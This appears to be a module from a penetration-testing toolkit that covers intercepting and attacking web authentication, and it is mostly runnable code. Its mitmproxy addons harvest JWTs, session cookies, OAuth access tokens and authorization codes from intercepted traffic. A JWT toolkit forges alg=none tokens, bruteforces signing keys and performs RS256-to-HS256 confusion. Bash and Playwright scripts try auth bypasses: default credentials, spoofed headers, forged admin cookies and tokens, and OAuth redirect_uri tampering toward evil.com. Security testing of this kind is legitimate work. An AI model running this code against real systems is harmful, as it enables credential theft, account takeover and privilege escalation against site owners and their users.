# CasperPro Authentication Module

> Token Extraction, Analysis, and Manipulation using mitmproxy + curl + Python

## Overview

This module focuses on capturing, analyzing, and exploiting authentication mechanisms. Using mitmproxy for interception and Python for manipulation, we can test JWT vulnerabilities, session management issues, and authentication bypass techniques.

## Token Capture with mitmproxy

### JWT Token Capture Addon

```python
# jwt_capture.py
import json
import base64
import re
import mitmproxy.http

class JWTCapture:
    def __init__(self):
        self.tokens = []
        self.jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*')
    
    def request(self, flow: mitmproxy.http.HTTPFlow):
        self._extract_tokens(flow.request.headers, flow.request.pretty_url, "request")
        
        # Check body for tokens
        if flow.request.content:
            body = flow.request.get_text()
            self._extract_from_body(body, flow.request.pretty_url, "request")
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        self._extract_tokens(flow.response.headers, flow.request.pretty_url, "response")
        
        # Check body for tokens (login responses often contain tokens)
        if flow.response.content:
            body = flow.response.get_text()
            self._extract_from_body(body, flow.request.pretty_url, "response")
    
    def _extract_tokens(self, headers, url, source):
        for name, value in headers.items():
            # Authorization header
            if name.lower() == "authorization":
                if "Bearer " in value:
                    token = value.replace("Bearer ", "")
                    self._analyze_token(token, url, source, "Authorization header")
            
            # Cookie with JWT
            if name.lower() == "cookie" or name.lower() == "set-cookie":
                matches = self.jwt_pattern.findall(value)
                for match in matches:
                    self._analyze_token(match, url, source, "Cookie")
    
    def _extract_from_body(self, body, url, source):
        # Find JWTs in body
        matches = self.jwt_pattern.findall(body)
        for match in matches:
            self._analyze_token(match, url, source, "Response body")
        
        # Try parsing as JSON for token fields
        try:
            data = json.loads(body)
            token_fields = ["token", "access_token", "accessToken", "id_token", 
                          "idToken", "refresh_token", "refreshToken", "jwt"]
            
            for field in token_fields:
                if field in data and data[field]:
                    self._analyze_token(data[field], url, source, f"JSON field: {field}")
        except:
            pass
    
    def _analyze_token(self, token, url, source, location):
        """Decode and analyze JWT token"""
        try:
            parts = token.split(".")
            if len(parts) < 2:
                return
            
            # Decode header and payload
            header = json.loads(self._base64_decode(parts[0]))
            payload = json.loads(self._base64_decode(parts[1]))
            
            token_info = {
                "token": token,
                "url": url,
                "source": source,
                "location": location,
                "header": header,
                "payload": payload,
                "algorithm": header.get("alg"),
                "vulnerabilities": []
            }
            
            # Check for vulnerabilities
            if header.get("alg") == "none":
                token_info["vulnerabilities"].append("CRITICAL: Algorithm is 'none'")
            
            if header.get("alg") in ["HS256", "HS384", "HS512"]:
                token_info["vulnerabilities"].append("INFO: Symmetric algorithm - key bruteforce possible")
            
            if "exp" not in payload:
                token_info["vulnerabilities"].append("MEDIUM: No expiration claim")
            
            if "admin" in str(payload).lower() or "role" in str(payload).lower():
                token_info["vulnerabilities"].append("INFO: Contains role/admin claims - privilege escalation target")
            
            self.tokens.append(token_info)
            self._save()
            
            print(f"[!] JWT captured from {location}")
            print(f"    Algorithm: {header.get('alg')}")
            print(f"    Payload: {json.dumps(payload)[:100]}...")
            
        except Exception as e:
            pass
    
    def _base64_decode(self, data):
        # Add padding if needed
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data).decode('utf-8')
    
    def _save(self):
        with open("/tmp/jwt_tokens.json", "w") as f:
            json.dump(self.tokens, f, indent=2)

addons = [JWTCapture()]
```

### Session Cookie Capture

```python
# session_capture.py
import json
import mitmproxy.http
from datetime import datetime

class SessionCapture:
    def __init__(self):
        self.sessions = {}
        self.session_patterns = [
            "session", "sess", "sid", "jsessionid", "phpsessid", 
            "asp.net_sessionid", "cfid", "cftoken", "connect.sid"
        ]
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        set_cookie = flow.response.headers.get_all("set-cookie")
        
        for cookie in set_cookie:
            for pattern in self.session_patterns:
                if pattern.lower() in cookie.lower():
                    self._analyze_session_cookie(cookie, flow.request.pretty_url)
    
    def _analyze_session_cookie(self, cookie, url):
        parts = cookie.split(";")
        name_value = parts[0].split("=", 1)
        
        if len(name_value) < 2:
            return
        
        name, value = name_value
        attributes = {}
        
        for part in parts[1:]:
            part = part.strip()
            if "=" in part:
                k, v = part.split("=", 1)
                attributes[k.lower()] = v
            else:
                attributes[part.lower()] = True
        
        session_info = {
            "name": name,
            "value": value,
            "url": url,
            "captured_at": datetime.now().isoformat(),
            "attributes": attributes,
            "vulnerabilities": []
        }
        
        # Security checks
        if "httponly" not in attributes:
            session_info["vulnerabilities"].append("MEDIUM: HttpOnly flag not set - XSS can steal session")
        
        if "secure" not in attributes and "https" in url:
            session_info["vulnerabilities"].append("MEDIUM: Secure flag not set - session sent over HTTP")
        
        if "samesite" not in attributes:
            session_info["vulnerabilities"].append("LOW: SameSite not set - CSRF possible")
        
        # Check for weak session ID
        if len(value) < 32:
            session_info["vulnerabilities"].append("HIGH: Short session ID - may be predictable")
        
        if value.isdigit():
            session_info["vulnerabilities"].append("CRITICAL: Numeric session ID - likely sequential")
        
        self.sessions[name] = session_info
        self._save()
        
        print(f"[!] Session cookie captured: {name}")
        for vuln in session_info["vulnerabilities"]:
            print(f"    {vuln}")
    
    def _save(self):
        with open("/tmp/session_cookies.json", "w") as f:
            json.dump(self.sessions, f, indent=2)

addons = [SessionCapture()]
```

## JWT Manipulation with Python

### JWT Toolkit

```python
# jwt_toolkit.py
import json
import base64
import hmac
import hashlib
import subprocess

class JWTToolkit:
    def __init__(self, token=None):
        self.token = token
        self.header = None
        self.payload = None
        self.signature = None
        
        if token:
            self.decode()
    
    def decode(self):
        """Decode JWT without verification"""
        parts = self.token.split(".")
        self.header = json.loads(self._b64decode(parts[0]))
        self.payload = json.loads(self._b64decode(parts[1]))
        self.signature = parts[2] if len(parts) > 2 else ""
        return self.header, self.payload
    
    def _b64decode(self, data):
        padding = 4 - len(data) % 4
        if padding != 4:
            data += "=" * padding
        return base64.urlsafe_b64decode(data).decode('utf-8')
    
    def _b64encode(self, data):
        if isinstance(data, str):
            data = data.encode()
        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
    
    def forge_none_algorithm(self, payload_modifications=None):
        """Create token with alg=none (CVE-2015-9235)"""
        new_header = {"alg": "none", "typ": "JWT"}
        new_payload = self.payload.copy()
        
        if payload_modifications:
            new_payload.update(payload_modifications)
        
        h = self._b64encode(json.dumps(new_header))
        p = self._b64encode(json.dumps(new_payload))
        
        return f"{h}.{p}."
    
    def forge_with_key(self, key, algorithm="HS256", payload_modifications=None):
        """Sign token with a known key"""
        new_payload = self.payload.copy()
        
        if payload_modifications:
            new_payload.update(payload_modifications)
        
        h = self._b64encode(json.dumps(self.header))
        p = self._b64encode(json.dumps(new_payload))
        
        message = f"{h}.{p}"
        
        if algorithm == "HS256":
            sig = hmac.new(key.encode(), message.encode(), hashlib.sha256).digest()
        elif algorithm == "HS384":
            sig = hmac.new(key.encode(), message.encode(), hashlib.sha384).digest()
        elif algorithm == "HS512":
            sig = hmac.new(key.encode(), message.encode(), hashlib.sha512).digest()
        else:
            raise ValueError(f"Unsupported algorithm: {algorithm}")
        
        s = self._b64encode(sig)
        return f"{h}.{p}.{s}"
    
    def bruteforce_key(self, wordlist_path="/usr/share/wordlists/rockyou.txt", max_attempts=10000):
        """Attempt to bruteforce the signing key"""
        h, p = self.token.rsplit(".", 1)[0], self.token.rsplit(".", 1)[1]
        message = self.token.rsplit(".", 1)[0]
        target_sig = self.signature
        
        algorithm = self.header.get("alg", "HS256")
        
        if algorithm not in ["HS256", "HS384", "HS512"]:
            print(f"[-] Algorithm {algorithm} not supported for bruteforce")
            return None
        
        try:
            with open(wordlist_path, "r", errors="ignore") as f:
                for i, key in enumerate(f):
                    if i >= max_attempts:
                        break
                    
                    key = key.strip()
                    test_token = self.forge_with_key(key, algorithm)
                    test_sig = test_token.split(".")[2]
                    
                    if test_sig == target_sig:
                        print(f"[!] KEY FOUND: {key}")
                        return key
                    
                    if i % 1000 == 0:
                        print(f"[*] Tried {i} keys...")
        except FileNotFoundError:
            print(f"[-] Wordlist not found: {wordlist_path}")
        
        return None
    
    def algorithm_confusion(self, public_key):
        """RS256 to HS256 algorithm confusion attack"""
        new_header = self.header.copy()
        new_header["alg"] = "HS256"
        
        h = self._b64encode(json.dumps(new_header))
        p = self._b64encode(json.dumps(self.payload))
        
        message = f"{h}.{p}"
        sig = hmac.new(public_key.encode(), message.encode(), hashlib.sha256).digest()
        s = self._b64encode(sig)
        
        return f"{h}.{p}.{s}"

# Example usage
if __name__ == "__main__":
    # Load captured tokens
    with open("/tmp/jwt_tokens.json") as f:
        tokens = json.load(f)
    
    for t in tokens:
        print(f"\n[*] Analyzing token from {t['url']}")
        
        toolkit = JWTToolkit(t["token"])
        print(f"    Header: {toolkit.header}")
        print(f"    Payload: {toolkit.payload}")
        
        # Try none algorithm attack
        forged = toolkit.forge_none_algorithm({"role": "admin", "is_admin": True})
        print(f"    Forged (alg=none): {forged[:80]}...")
        
        # Try common weak keys
        common_keys = ["secret", "password", "key", "private", "jwt_secret", 
                       "your-256-bit-secret", "changeme", "test"]
        
        for key in common_keys:
            test_token = toolkit.forge_with_key(key)
            if test_token.split(".")[2] == t["token"].split(".")[2]:
                print(f"    [!] WEAK KEY FOUND: {key}")
                break
```

## Authentication Bypass Testing

### curl-based Auth Bypass Tests

```bash
#!/bin/bash
# auth_bypass.sh

TARGET=$1
ENDPOINT=$2

echo "[*] Testing authentication bypass on $TARGET$ENDPOINT"

# Test 1: No authentication
echo "[*] Test 1: No authentication header"
curl -s -o /dev/null -w "%{http_code}" "$TARGET$ENDPOINT"
echo ""

# Test 2: Empty Bearer token
echo "[*] Test 2: Empty Bearer token"
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer " "$TARGET$ENDPOINT"
echo ""

# Test 3: null/undefined tokens
echo "[*] Test 3: null/undefined tokens"
for token in "null" "undefined" "nil" "None" "false" "0" "{}"; do
  echo -n "    Bearer $token: "
  curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $token" "$TARGET$ENDPOINT"
  echo ""
done

# Test 4: JWT with alg=none
echo "[*] Test 4: JWT with alg=none"
NONE_JWT="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyLCJyb2xlIjoiYWRtaW4ifQ."
curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $NONE_JWT" "$TARGET$ENDPOINT"
echo ""

# Test 5: Basic auth bypass
echo "[*] Test 5: Basic auth variations"
for creds in "admin:admin" "admin:" ":admin" ":" "admin:password" "test:test"; do
  encoded=$(echo -n "$creds" | base64)
  echo -n "    Basic $creds: "
  curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Basic $encoded" "$TARGET$ENDPOINT"
  echo ""
done

# Test 6: Header manipulation
echo "[*] Test 6: Header manipulation"
headers=(
  "X-Forwarded-For: 127.0.0.1"
  "X-Real-IP: 127.0.0.1"
  "X-Original-URL: /admin"
  "X-Rewrite-URL: /admin"
  "X-Custom-IP-Authorization: 127.0.0.1"
)

for header in "${headers[@]}"; do
  echo -n "    $header: "
  curl -s -o /dev/null -w "%{http_code}" -H "$header" "$TARGET$ENDPOINT"
  echo ""
done

# Test 7: Method override
echo "[*] Test 7: HTTP method override"
for method in "GET" "POST" "PUT" "DELETE" "PATCH" "OPTIONS" "HEAD"; do
  echo -n "    $method: "
  curl -s -o /dev/null -w "%{http_code}" -X "$method" "$TARGET$ENDPOINT"
  echo ""
done

echo "[*] Authentication bypass testing complete"
```

### Playwright-based Auth Testing

```python
# auth_test.py
from playwright.sync_api import sync_playwright
import json

def test_auth_bypass(target, protected_endpoint, proxy_port=8082):
    """Test various authentication bypass techniques via browser"""
    
    results = []
    
    with sync_playwright() as p:
        browser = p.chromium.launch(
            proxy={"server": f"http://127.0.0.1:{proxy_port}"},
            headless=True
        )
        
        # Test 1: Direct access without auth
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        
        response = page.goto(f"{target}{protected_endpoint}")
        results.append({
            "test": "Direct access (no auth)",
            "status": response.status,
            "url": response.url
        })
        context.close()
        
        # Test 2: With manipulated localStorage
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        
        # Set fake auth in storage before navigating
        page.goto(target)
        page.evaluate('''() => {
            localStorage.setItem("token", "fake_token");
            localStorage.setItem("isAuthenticated", "true");
            localStorage.setItem("user", JSON.stringify({role: "admin"}));
        }''')
        
        response = page.goto(f"{target}{protected_endpoint}")
        results.append({
            "test": "Fake localStorage auth",
            "status": response.status,
            "url": response.url
        })
        context.close()
        
        # Test 3: With forged JWT in localStorage
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        
        forged_jwt = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxIiwicm9sZSI6ImFkbWluIn0."
        
        page.goto(target)
        page.evaluate(f'''() => {{
            localStorage.setItem("token", "{forged_jwt}");
            localStorage.setItem("accessToken", "{forged_jwt}");
        }}''')
        
        response = page.goto(f"{target}{protected_endpoint}")
        results.append({
            "test": "Forged JWT (alg=none)",
            "status": response.status,
            "url": response.url
        })
        context.close()
        
        # Test 4: Cookie manipulation
        context = browser.new_context(ignore_https_errors=True)
        page = context.new_page()
        
        page.goto(target)
        context.add_cookies([
            {"name": "authenticated", "value": "true", "domain": target.replace("https://", "").replace("http://", "").split("/")[0], "path": "/"},
            {"name": "role", "value": "admin", "domain": target.replace("https://", "").replace("http://", "").split("/")[0], "path": "/"},
            {"name": "isAdmin", "value": "1", "domain": target.replace("https://", "").replace("http://", "").split("/")[0], "path": "/"}
        ])
        
        response = page.goto(f"{target}{protected_endpoint}")
        results.append({
            "test": "Forged cookies",
            "status": response.status,
            "url": response.url
        })
        context.close()
        
        browser.close()
    
    # Save results
    with open("/tmp/auth_bypass_results.json", "w") as f:
        json.dump(results, f, indent=2)
    
    # Print summary
    print("[*] Authentication Bypass Test Results:")
    for r in results:
        status_indicator = "[!]" if r["status"] == 200 else "[-]"
        print(f"  {status_indicator} {r['test']}: HTTP {r['status']}")
    
    return results

if __name__ == "__main__":
    import sys
    target = sys.argv[1] if len(sys.argv) > 1 else "https://example.com"
    endpoint = sys.argv[2] if len(sys.argv) > 2 else "/admin"
    test_auth_bypass(target, endpoint)
```

## OAuth/OIDC Testing

### OAuth Flow Interception

```python
# oauth_intercept.py
import json
import re
import mitmproxy.http
from urllib.parse import urlparse, parse_qs

class OAuthInterceptor:
    def __init__(self):
        self.oauth_flows = []
        self.tokens = []
        
    def request(self, flow: mitmproxy.http.HTTPFlow):
        url = flow.request.pretty_url
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # Detect OAuth authorization requests
        if any(x in url for x in ["/authorize", "/oauth", "/auth"]):
            if "client_id" in params or "response_type" in params:
                flow_data = {
                    "type": "authorization_request",
                    "url": url,
                    "client_id": params.get("client_id", [""])[0],
                    "redirect_uri": params.get("redirect_uri", [""])[0],
                    "response_type": params.get("response_type", [""])[0],
                    "scope": params.get("scope", [""])[0],
                    "state": params.get("state", [""])[0],
                    "vulnerabilities": []
                }
                
                # Check for vulnerabilities
                redirect_uri = params.get("redirect_uri", [""])[0]
                if redirect_uri:
                    # Open redirect check
                    if not redirect_uri.startswith("https://"):
                        flow_data["vulnerabilities"].append("MEDIUM: Redirect URI not HTTPS")
                
                if not params.get("state"):
                    flow_data["vulnerabilities"].append("MEDIUM: No state parameter - CSRF possible")
                
                self.oauth_flows.append(flow_data)
                print(f"[!] OAuth authorization request captured")
        
        # Detect token requests
        if "/token" in url and flow.request.method == "POST":
            body = flow.request.get_text()
            flow_data = {
                "type": "token_request",
                "url": url,
                "body": body,
                "vulnerabilities": []
            }
            
            self.oauth_flows.append(flow_data)
            print(f"[!] OAuth token request captured")
        
        self._save()
    
    def response(self, flow: mitmproxy.http.HTTPFlow):
        # Capture token responses
        if flow.response.content:
            body = flow.response.get_text()
            try:
                data = json.loads(body)
                if "access_token" in data:
                    self.tokens.append({
                        "url": flow.request.pretty_url,
                        "access_token": data.get("access_token"),
                        "token_type": data.get("token_type"),
                        "refresh_token": data.get("refresh_token"),
                        "expires_in": data.get("expires_in"),
                        "scope": data.get("scope")
                    })
                    print(f"[!] OAuth token captured: {data.get('access_token', '')[:50]}...")
            except:
                pass
        
        # Check for tokens in redirect
        if flow.response.status_code in [301, 302, 303, 307, 308]:
            location = flow.response.headers.get("location", "")
            if "access_token=" in location or "code=" in location:
                parsed = urlparse(location)
                fragment_params = parse_qs(parsed.fragment)
                query_params = parse_qs(parsed.query)
                
                if "access_token" in fragment_params:
                    self.tokens.append({
                        "url": location,
                        "access_token": fragment_params["access_token"][0],
                        "source": "implicit_flow_redirect"
                    })
                    print(f"[!] Implicit flow token captured")
                
                if "code" in query_params:
                    self.oauth_flows.append({
                        "type": "authorization_code",
                        "url": location,
                        "code": query_params["code"][0]
                    })
                    print(f"[!] Authorization code captured")
        
        self._save()
    
    def _save(self):
        output = {
            "flows": self.oauth_flows,
            "tokens": self.tokens
        }
        with open("/tmp/oauth_capture.json", "w") as f:
            json.dump(output, f, indent=2)

addons = [OAuthInterceptor()]
```

### OAuth Vulnerability Tests

```bash
#!/bin/bash
# oauth_test.sh

AUTH_URL=$1
CLIENT_ID=$2
REDIRECT_URI=$3

echo "[*] Testing OAuth vulnerabilities on $AUTH_URL"

# Test 1: Open redirect via redirect_uri
echo "[*] Test 1: Open redirect vulnerabilities"
test_uris=(
  "https://evil.com"
  "https://evil.com%40$REDIRECT_URI"
  "$REDIRECT_URI/../../../evil.com"
  "$REDIRECT_URI@evil.com"
  "javascript:alert(1)"
  "//evil.com"
)

for uri in "${test_uris[@]}"; do
  echo -n "    $uri: "
  response=$(curl -s -o /dev/null -w "%{http_code}" "$AUTH_URL?client_id=$CLIENT_ID&redirect_uri=$uri&response_type=code")
  echo "$response"
done

# Test 2: State parameter bypass
echo "[*] Test 2: CSRF (no state parameter)"
response=$(curl -s -o /dev/null -w "%{http_code}" "$AUTH_URL?client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&response_type=code")
echo "    Without state: $response"

# Test 3: Scope escalation
echo "[*] Test 3: Scope escalation"
scopes=("admin" "root" "write" "delete" "openid profile email admin" "*")
for scope in "${scopes[@]}"; do
  echo -n "    Scope '$scope': "
  response=$(curl -s -o /dev/null -w "%{http_code}" "$AUTH_URL?client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&response_type=code&scope=$scope")
  echo "$response"
done

# Test 4: Response type manipulation
echo "[*] Test 4: Response type manipulation"
response_types=("token" "code token" "id_token" "code id_token token")
for rt in "${response_types[@]}"; do
  echo -n "    response_type='$rt': "
  response=$(curl -s -o /dev/null -w "%{http_code}" "$AUTH_URL?client_id=$CLIENT_ID&redirect_uri=$REDIRECT_URI&response_type=$rt")
  echo "$response"
done

echo "[*] OAuth vulnerability testing complete"
```

## Session Management Testing

### Session Fixation Test

```python
# session_fixation.py
from playwright.sync_api import sync_playwright
import time

def test_session_fixation(target, login_url, username, password, 
                          username_selector, password_selector, submit_selector):
    """Test for session fixation vulnerability"""
    
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        
        # Step 1: Get initial session (as attacker)
        context = browser.new_context()
        page = context.new_page()
        page.goto(target)
        
        initial_cookies = context.cookies()
        session_cookies = [c for c in initial_cookies 
                         if any(x in c["name"].lower() for x in ["session", "sid", "sess"])]
        
        print("[*] Initial session cookies (before auth):")
        for c in session_cookies:
            print(f"    {c['name']}: {c['value'][:50]}...")
        
        context.close()
        
        # Step 2: Login with the same session
        context = browser.new_context()
        page = context.new_page()
        
        # Set the pre-authentication session
        if session_cookies:
            context.add_cookies(session_cookies)
        
        page.goto(login_url)
        page.fill(username_selector, username)
        page.fill(password_selector, password)
        page.click(submit_selector)
        page.wait_for_load_state("networkidle")
        
        # Step 3: Check if session changed after auth
        post_auth_cookies = context.cookies()
        post_session_cookies = [c for c in post_auth_cookies 
                               if any(x in c["name"].lower() for x in ["session", "sid", "sess"])]
        
        print("\n[*] Session cookies after authentication:")
        for c in post_session_cookies:
            print(f"    {c['name']}: {c['value'][:50]}...")
        
        # Compare
        vulnerable = False
        for pre in session_cookies:
            for post in post_session_cookies:
                if pre["name"] == post["name"] and pre["value"] == post["value"]:
                    print(f"\n[!] VULNERABLE: Session ID did not change after authentication!")
                    print(f"    Cookie: {pre['name']}")
                    vulnerable = True
        
        if not vulnerable:
            print("\n[+] Not vulnerable: Session ID changed after authentication")
        
        context.close()
        browser.close()
        
        return vulnerable

if __name__ == "__main__":
    test_session_fixation(
        target="https://example.com",
        login_url="https://example.com/login",
        username="testuser",
        password="testpass",
        username_selector='input[name="email"]',
        password_selector='input[name="password"]',
        submit_selector='button[type="submit"]'
    )
```

## Output Files

| File | Description |
|------|-------------|
| `/tmp/jwt_tokens.json` | Captured and analyzed JWT tokens |
| `/tmp/session_cookies.json` | Session cookie analysis |
| `/tmp/oauth_capture.json` | OAuth flow data and tokens |
| `/tmp/auth_bypass_results.json` | Authentication bypass test results |

---

**Next Step:** Use captured tokens with **casperpro-business-logic.md** to test for IDOR and access control vulnerabilities, or **casperpro-business-logic-advanced.md** for multi-tenant isolation testing.
